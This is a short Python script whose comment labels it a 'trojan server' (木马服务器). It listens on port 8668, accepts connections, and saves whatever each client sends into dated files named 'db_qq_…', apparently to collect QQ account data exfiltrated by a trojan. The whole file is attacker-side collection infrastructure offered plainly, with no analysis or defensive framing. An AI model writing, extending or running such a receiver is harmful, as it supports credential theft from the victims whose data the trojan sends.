# -*- coding: utf-8 -*- 
import socket
import datetime
'''
木马服务器

'''
sk = socket.socket()

sk.bind(("0.0.0.0",8668))
sk.listen(15)
i = 0
while True:
    conn,address = sk.accept()
    date = datetime.date.today()
    today = str(date.year)+"-"+str(date.month)+"-"+str(date.day)
	
    info = conn.recv(1024)
    info_str = str(info)
    

    conn.sendall(bytes("copy!"))
	
    f = open("db_qq_"+today+"_"+str(i)+".txt","wb")
    f.write(info_str)
    f.close()
	
    i+=1 
	


'''
 2018-11-12
'''